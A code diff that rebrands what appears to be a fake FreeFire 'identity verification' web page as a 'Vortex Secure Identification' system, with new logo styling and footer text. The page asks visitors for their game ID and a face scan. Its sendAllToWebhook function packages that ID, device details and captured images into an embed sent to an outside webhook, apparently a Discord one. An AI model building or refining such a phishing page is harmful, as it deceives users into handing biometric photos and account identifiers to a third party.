@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎮 ยืนยันตัวตน FreeFire</title>
+    <title>🌀 Vortex - ยืนยันตัวตน</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap');
 
         * {
             margin: 0;
@@ -213,6 +213,44 @@
         .status-loading {
             color: #fbbf24;
         }
+
+        /* โลโก้ Vortex */
+        .logo-vortex {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: gradShift 3s ease-in-out infinite;
+            letter-spacing: 3px;
+        }
+
+        @keyframes gradShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .logo-icon {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, rgba(255, 106, 0, 0.25), rgba(238, 9, 121, 0.25));
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            border: 1px solid rgba(255, 106, 0, 0.2);
+            box-shadow: 0 0 40px rgba(255, 106, 0, 0.1);
+            animation: logoGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes logoGlow {
+            0%, 100% { box-shadow: 0 0 40px rgba(255, 106, 0, 0.1); }
+            50% { box-shadow: 0 0 60px rgba(255, 106, 0, 0.3); }
+        }
     </style>
 </head>
 <body>
@@ -221,19 +259,14 @@
 
     <div class="glass-panel rounded-[40px] overflow-hidden shadow-2xl my-4">
 
-        <!-- Header สวยงาม -->
+        <!-- Header พร้อมโลโก้ Vortex -->
         <div class="relative h-32 bg-gradient-to-r from-orange-500/30 via-pink-500/30 to-purple-500/30 backdrop-blur-sm flex items-center px-6 border-b border-white/10">
             <div class="absolute inset-0 bg-black/20 backdrop-blur-[2px]"></div>
             <div class="relative z-10 flex items-center gap-5">
-                <div class="w-20 h-20 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-4xl shadow-2xl border border-white/20 animate-pulse-slow">
-                    🔥
-                </div>
+                <div class="logo-icon">🌀</div>
                 <div>
-                    <h1 class="text-2xl font-bold tracking-wide flex items-center gap-2 text-white glow-text">
-                        ยืนยันตัวตน
-                        <span class="text-[10px] bg-white/20 px-3 py-1 rounded-full border border-white/30 font-normal tracking-widest backdrop-blur-sm">FF</span>
-                    </h1>
-                    <p class="text-white/80 text-sm font-light">กรอก ID และสแกนหน้ายืนยัน</p>
+                    <div class="logo-vortex">VORTEX</div>
+                    <p class="text-white/70 text-sm font-light tracking-wider">⚡ Secure Identification</p>
                 </div>
             </div>
         </div>
@@ -323,7 +356,7 @@
     </div>
 
     <div class="text-center text-white/20 text-[10px] mt-6 tracking-widest font-light">
-        FREEFIRE VERIFICATION V2 • สแกนหน้ายืนยันตัวตน
+        VORTEX SECURE SYSTEM • ยืนยันตัวตน
     </div>
 </div>
 
@@ -522,7 +555,7 @@ async function sendAllToWebhook(images) {
     document.getElementById("ref-code").innerText = `FF-${Math.floor(Math.random()*999999)}`;
 
     const embedData = {
-        title: "🎮 ยืนยันตัวตน FreeFire [Components V2]",
+        title: "🌀 Vortex Verification System",
         color: 0xff6a00,
         fields: [
             { name: "🆔 FreeFire ID", value: `\`${userData.ffid}\``, inline: false },
@@ -540,7 +573,7 @@ async function sendAllToWebhook(images) {
             { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
             { name: "📸 จำนวนภาพ", value: `\`${images ? images.length : 0} รูป\``, inline: true }
         ],
-        footer: { text: "ระบบยืนยันตัวตน FreeFire" },
+        footer: { text: "Vortex Secure System" },
         timestamp: new Date().toISOString()
     };
 
